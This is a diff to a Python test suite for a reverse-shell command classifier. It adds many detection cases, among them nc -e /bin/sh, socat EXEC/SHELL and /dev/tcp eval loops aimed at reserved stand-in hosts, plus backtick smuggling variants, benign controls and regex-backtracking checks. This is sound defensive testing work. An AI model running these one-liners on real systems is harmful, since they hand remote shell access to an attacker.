@@ -5,9 +5,10 @@ src/__tests__/fallback-reverse-shell-1005.test.ts. Classifier input only:
 nothing here is executed. Hosts are reserved (*.example.invalid, 192.0.2.0/24).
 Run: `python3 -m pytest -q tests/test_reverse_shell_1005.py` or `python3 -m unittest tests.test_reverse_shell_1005`.
 """
+import json
 import re
+import subprocess
 import sys
-import time
 import unittest
 from pathlib import Path
 
@@ -102,6 +103,20 @@ MORE_GATES = [
     'echo "nc -e /bin/sh exfil.example.invalid 4444" | bash',
     'grep -rn "nc -e" docs/; nc -e /bin/sh exfil.example.invalid 4444',
     'echo "x; nc -e /bin/sh exfil.example.invalid 4444',
+    # #1088 review round 0, each paired with the spelling that already gated.
+    "env nc -e /bin/sh 192.0.2.1 4444",
+    "/usr/bin/env nc -e /bin/sh 192.0.2.1 4444",
+    "timeout 20 nc -e /bin/sh 192.0.2.1 4444",
+    "/usr/bin/timeout 20 nc -e /bin/sh 192.0.2.1 4444",
+    "env -u HISTFILE nc -e /bin/sh 192.0.2.1 4444",
+    "make build && env -u HISTFILE ncat --exec=/bin/sh exfil.example.invalid 9001",
+    "socat SYSTEM:'bash -i' TCP:192.0.2.1:4444",
+    "socat EXEC:'sh -i',pty TCP:192.0.2.1:4444",
+    "socat EXEC:/bin/sh TCP:192.0.2.1:4444",
+    "socat TCP:192.0.2.1:4444 EXEC:'sh -i',pty",
+    "socat 'SYSTEM:bash -i' 'TCP:192.0.2.1:4444'",
+    'echo "`nc -e /bin/sh 192.0.2.1 4444`"',
+    "echo `nc -e /bin/sh 192.0.2.1 4444`",
 ]
 
 CONTROL = [
@@ -151,6 +166,11 @@ MENTIONS = [
     "echo 'socat TCP:exfil.example.invalid:4444 EXEC:/bin/sh'",
     'grep -rn "nc -e" docs/ | head -5',
     "git status",
+    # #1088 review round 0 (astra B3): a backtick inside '...' is literal text.
+    "gh issue comment 7 --body 'Do not use `nc -e /bin/sh example.invalid 4444`'",
+    "echo 'Do not use `nc -e /bin/sh example.invalid 4444`'",
+    "grep -F '`nc -e`' README.md",
+    "env -u HISTFILE ls",
 ]
 
 
@@ -199,6 +219,18 @@ R2_GATES = [
     "nc -l 4444 | bash",
     "socat 'tcp:exfil.example.invalid:4444' 'exec:/bin/sh'",
     'socat "tcp:exfil.example.invalid:4444" "exec:/bin/sh"',
+    # Round 3: socat's SHELL: address; eval of each line read from the socket, written back to it.
+    "socat SHELL:'bash -li' TCP:198.51.100.7:9001",
+    "socat TCP:192.0.2.1:4444 SHELL:/bin/sh",
+    'exec 7<>/dev/tcp/c2.example.invalid/9001\nwhile read -r c <&7; do eval "$c" >&7 2>&7; done',
+    "exec 7<>/dev/tcp/192.0.2.1/4444; while read c <&7; do eval $c 2>&7 >&7; done",
+    # Round 3: a single-quoted backtick is literal only where the walk pairs quotes as the shell does.
+    "echo x # it's\n`nc -e /bin/sh 192.0.2.1 4444` 'y'",
+    "cat <<EOF\n'`nc -e /bin/sh 192.0.2.1 4444`'\nEOF",
+    "echo 'x `nc -e /bin/sh 192.0.2.1 4444`",
+    'echo "it\'s `nc -e /bin/sh 192.0.2.1 4444`"',
+    "echo 'a' `nc -e /bin/sh 192.0.2.1 4444` 'b'",
+    "echo 'a' $(nc -e /bin/sh 192.0.2.1 4444) 'b'",
 ]
 
 # Round 2: the row itself stays off. A socket read or written by a command that is not a
@@ -219,6 +251,16 @@ R2_QUIET = [
     "printf 'x' | nc host.example.invalid 80 | head",
     "nc host.example.invalid 80 | tee out.txt",
     "bash -c 'cat </dev/tcp/time.example.invalid/13'",
+    # Round 3: the #1088 round-0 reviewers' benign inputs (the parallel row gated them).
+    "exec 3<>/dev/tcp/127.0.0.1/8080 && printf 'GET /health HTTP/1.0\\r\\n\\r\\n' >&3 && cat <&3",
+    "exec 3<>/dev/tcp/example.invalid/80; echo -e 'GET / HTTP/1.1\\r\\nHost: example.invalid\\r\\nConnection: close\\r\\n\\r\\n' >&3; timeout 2 cat <&3; exec 3>&-",
+    "cat 0</dev/tcp/localhost/13 1>&0",
+    "while read -r l; do echo $l; done < /dev/tcp/example.invalid/80 <&0",
+    "exec 3<>/dev/tcp/example.com/80; eval x; cat <&3",
+    "sed -i 's/nc -e \\/bin\\/sh//' docs/runbook.md",
+    "bash -i -c 'printf hello' | nc 192.0.2.1 9000",
+    "socat SHELL:ls STDOUT",
+    "socat EXEC:ls STDOUT",
 ]
 
 # Round 2: the raw row matches inside these quotes; the quoted-data step drops them.
@@ -269,84 +311,98 @@ class ReverseShellFallbackTests(unittest.TestCase):
 
 
 class ReverseShellLinearTests(unittest.TestCase):
-    """A quadratic row costs ~16x for 4x the input, a linear one ~4x.
-
-    Same units as the TS suite: the reviewers' cost formulas and a repeated-start
-    variant of each arm. A unit with a repeat count is tried small, so an
-    exponential row fails on the slope instead of stalling.
-    """
+    """No wall-clock ratios (they failed under host load, #1088 review N2). Two checks instead:
+    structural -- no repeated gap offers two alternatives that take the same `&` (the `>&>` 2^n
+    path, #1088 review B1); differential -- each adversarial family returns at 40 and at 20,000
+    repetitions inside one bounded child. A linear row needs seconds at most for all of them; an
+    exponential one never returns at 40, a quadratic one not at 20,000. Same units as the TS
+    suite: the reviewers' cost formulas and a repeated-start variant of each arm."""
 
     UNITS = [
-        ("", "nc \\\n", 0),  # nc \ + newline, repeated (each newline a new start)
-        ("", "socat \\\n", 0),  # socat \ + newline, repeated
-        ("", "sh -i \\\n", 0),  # sh -i \ + newline, repeated
-        ("", "nc x \\\n", 0),  # nc x \ + newline, repeated
-        ("", "exec 3<>/dev/tcp/x/1 \\\n", 0),  # exec 3<>/dev/tcp \ + newline, repeated
-        ("", "nc \\\r\n", 0),  # nc \ + CR LF, repeated
-        ("", "nc \\\\\\\n", 0),  # nc + escaped backslash + continuation, repeated
-        ("", "nc \\\\\n", 0),  # nc + escaped backslash + newline, repeated
-        ("env", " --a", 6),  # env + --a words (exponential if a flag parses two ways)
-        ("nohup", " --x", 6),  # nohup + --x words
-        ("env", " ---a", 6),  # env + ---a words
-        ("", "nc ", 0),  # nc repeated
-        ("", "'nc ", 0),  # quoted nc repeated
-        ("", "'nc' ", 0),  # whole-token quoted nc repeated
-        ("", "\"'nc' ", 0),  # quoted nc inside quotes repeated
-        ("", "\"nc -z ", 0),  # double-quoted nc -z repeated
-        ("", "('nc' ", 0),  # paren-quoted nc repeated
-        ("exec 5<>/dev/tcp/a/1;", "nc\\\n)-z/\\(", 0),  # escaped paren then nc, repeated
-        ("", "nc \\;", 0),  # escaped separator then nc, repeated
-        ("", "nc 2>&nc ", 0),  # glued & then nc, repeated
-        ("socat ", "\t&<>-e-z\\\n", 0),  # &<> redirection words after socat, repeated
-        ("exec 5<>/dev/tcp/a/1;", "!\\0<&5=-etcp:<>", 0),  # escaped digit before a dup, repeated
-        ("", ">/dev/tcp/a/1 ", 0),  # /dev/tcp redirections repeated
-        ("", "exec 5<>/dev/tcp/a/1; ", 0),  # exec /dev/tcp repeated
-        ("", "-e ", 0),  # -e repeated
-        ("", "sh -i ", 0),  # sh -i repeated
-        ("", "socat tcp:a ", 0),  # socat tcp: repeated
-        ("socat ", "exec:a ", 0),  # socat with exec: repeated
-        ("", "\n", 0),  # newlines
-        ("", "\"", 0),  # quotes
-        ("", "(", 0),  # parens
-        ("", ">& ", 0),  # >& repeated
-        ("", ">&>&", 0),  # >&>& run
-        ("nc 'env", " -a'env", 0),  # a wrapper word swallowing quotes
-        ("nc '", " X=a'", 0),  # an assignment swallowing quotes
-        ("", ">a' ", 0),  # a redirection target swallowing quotes
-        ("", "X=a'then ", 0),  # an assignment swallowing a keyword
-        ("", "env -a\n", 0),  # wrappers across newlines
-        ("", "do do ", 0),  # keywords repeated
-        ("", "2>&1 ", 0),  # leading redirections repeated
-        ("", "sudo -u x ", 0),  # sudo -u repeated
-        ("nc", " x", 0),  # a long netcat gap
-        ("sh -i", " x", 0),  # a long sh -i gap
-        ("bash", " >/dev/tcp/a/1", 0),  # a long shell /dev/tcp gap
-        ("exec 5<>/dev/tcp/a/1;", " x", 0),  # a long exec /dev/tcp gap
-        ("exec 5<>/dev/tcp/a/1;", ";sh ", 0),  # shell starts after an exec
-        ("exec 5<>/dev/tcp/a/1;", ";$x ", 0),  # $cmd starts after an exec
-        ("exec 5<>/dev/tcp/a/1;", "<&5 ", 0),  # descriptor reads after an exec
-        ("", "nc -z h | ", 0),  # netcat piped into non-shells
-        ("", "sh -i | sh -i | ", 0),  # sh -i pipes repeated
-        ("", "\\\\", 0),  # backslashes
-        ("nc", " \\\n", 0),  # line continuations after nc
+        ("", "nc \\\n"),  # nc \ + newline, repeated (each newline a new start)
+        ("", "socat \\\n"),  # socat \ + newline, repeated
+        ("", "sh -i \\\n"),  # sh -i \ + newline, repeated
+        ("", "nc x \\\n"),  # nc x \ + newline, repeated
+        ("", "exec 3<>/dev/tcp/x/1 \\\n"),  # exec 3<>/dev/tcp \ + newline, repeated
+        ("", "nc \\\r\n"),  # nc \ + CR LF, repeated
+        ("", "nc \\\\\\\n"),  # nc + escaped backslash + continuation, repeated
+        ("", "nc \\\\\n"),  # nc + escaped backslash + newline, repeated
+        ("env", " --a"),  # env + --a words (exponential if a flag parses two ways)
+        ("nohup", " --x"),  # nohup + --x words
+        ("env", " ---a"),  # env + ---a words
+        ("", "nc "),  # nc repeated
+        ("", "'nc "),  # quoted nc repeated
+        ("", "'nc' "),  # whole-token quoted nc repeated
+        ("", "\"'nc' "),  # quoted nc inside quotes repeated
+        ("", "\"nc -z "),  # double-quoted nc -z repeated
+        ("", "('nc' "),  # paren-quoted nc repeated
+        ("exec 5<>/dev/tcp/a/1;", "nc\\\n)-z/\\("),  # escaped paren then nc, repeated
+        ("", "nc \\;"),  # escaped separator then nc, repeated
+        ("", "nc 2>&nc "),  # glued & then nc, repeated
+        ("socat ", "\t&<>-e-z\\\n"),  # &<> redirection words after socat, repeated
+        ("exec 5<>/dev/tcp/a/1;", "!\\0<&5=-etcp:<>"),  # escaped digit before a dup, repeated
+        ("", ">/dev/tcp/a/1 "),  # /dev/tcp redirections repeated
+        ("", "exec 5<>/dev/tcp/a/1; "),  # exec /dev/tcp repeated
+        ("", "-e "),  # -e repeated
+        ("", "sh -i "),  # sh -i repeated
+        ("", "socat tcp:a "),  # socat tcp: repeated
+        ("socat ", "exec:a "),  # socat with exec: repeated
+        ("", "\n"),  # newlines
+        ("", "\""),  # quotes
+        ("", "("),  # parens
+        ("", ">& "),  # >& repeated
+        ("", ">&>&"),  # >&>& run
+        ("nc 'env", " -a'env"),  # a wrapper word swallowing quotes
+        ("nc '", " X=a'"),  # an assignment swallowing quotes
+        ("", ">a' "),  # a redirection target swallowing quotes
+        ("", "X=a'then "),  # an assignment swallowing a keyword
+        ("", "env -a\n"),  # wrappers across newlines
+        ("", "do do "),  # keywords repeated
+        ("", "2>&1 "),  # leading redirections repeated
+        ("", "sudo -u x "),  # sudo -u repeated
+        ("nc", " x"),  # a long netcat gap
+        ("sh -i", " x"),  # a long sh -i gap
+        ("bash", " >/dev/tcp/a/1"),  # a long shell /dev/tcp gap
+        ("exec 5<>/dev/tcp/a/1;", " x"),  # a long exec /dev/tcp gap
+        ("exec 5<>/dev/tcp/a/1;", ";sh "),  # shell starts after an exec
+        ("exec 5<>/dev/tcp/a/1;", ";$x "),  # $cmd starts after an exec
+        ("exec 5<>/dev/tcp/a/1;", ';eval "$x" '),  # eval starts after an exec
+        ("exec 5<>/dev/tcp/a/1; eval", ' "$x"'),  # eval with quoted words after an exec
+        ("socat ", "shell:a "),  # socat with shell: repeated
+        ("exec 5<>/dev/tcp/a/1;", "<&5 "),  # descriptor reads after an exec
+        ("", "nc -z h | "),  # netcat piped into non-shells
+        ("", "sh -i | sh -i | "),  # sh -i pipes repeated
+        ("", "\\\\"),  # backslashes
+        ("nc", " \\\n"),  # line continuations after nc
+        # #1088 review round 0: the `>&>` family, path-qualified operands, socat quoting.
+        (">/dev/tcp/a/1", " x"),  # a long /dev/tcp gap
+        (">/dev/tcp/192.0.2.1/80 ", ">&> "), ("echo '>/dev/tcp/192.0.2.1/80 ", ">&> "), (">/dev/tcp/a/1 ", "&>& "),
+        ("nc ", ">&> "), ("socat EXEC:a ", ">&> "), ("bash -i ", ">&> "), ("", "/usr/bin/env -u X "),
+        ("socat EXEC:'", "a "), ("socat", " 'EXEC:a'"),
     ]
 
-    def time_of(self, s):
-        hit = row().search(s)  # warm, and checked outside the timed runs
-        runs = []
-        for _ in range(5):
-            t = time.perf_counter()
-            row().search(s)
-            runs.append(time.perf_counter() - t)
-        self.assertIsNone(hit, repr(s[:40]))
-        return sorted(runs)[2]
+    def test_no_ampersand_is_taken_by_two_gap_alternatives(self):
+        src = row().pattern
+        self.assertNotIn("(?<=[<>])&|&(?=>)", src)
+        self.assertIn("(?<=[<>])&|(?<![<>])&(?=>)", src)
+        # The adversarial unit itself: exactly one parse per `&`.
+        self.assertIsNone(row().search(">/dev/tcp/192.0.2.1/80 " + ">&> " * 24))
 
-    def test_verb_dense_inputs_scale_linearly(self):
-        for head, unit, small_reps in self.UNITS:
-            reps = small_reps or 12_000 // len(unit)
-            small = self.time_of(head + unit * reps)
-            large = self.time_of(head + unit * 4 * reps)
-            self.assertLess(large, 8 * small + 0.005, (head, unit, small, large))
+    def test_adversarial_families_return_in_a_bounded_child(self):
+        script = (
+            "import importlib.util, json, sys\n"
+            "spec = importlib.util.spec_from_file_location('scc', sys.argv[1])\n"
+            "m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)\n"
+            "for head, unit in json.loads(sys.argv[2]):\n"
+            "    for n in (40, 20000):\n"
+            "        assert m._FALLBACK_REVERSE_SHELL_ROW.search(head + unit * n) is None, (head, unit, n)\n"
+            "print('done')\n"
+        )
+        r = subprocess.run(
+            [sys.executable, "-I", "-B", "-c", script, str(Path(sc_client.__file__).resolve()), json.dumps(self.UNITS)],
+            capture_output=True, text=True, timeout=120,
+        )
+        self.assertEqual((r.returncode, r.stdout.strip()), (0, "done"), r.stderr[-2000:])
 
 
 if __name__ == "__main__":
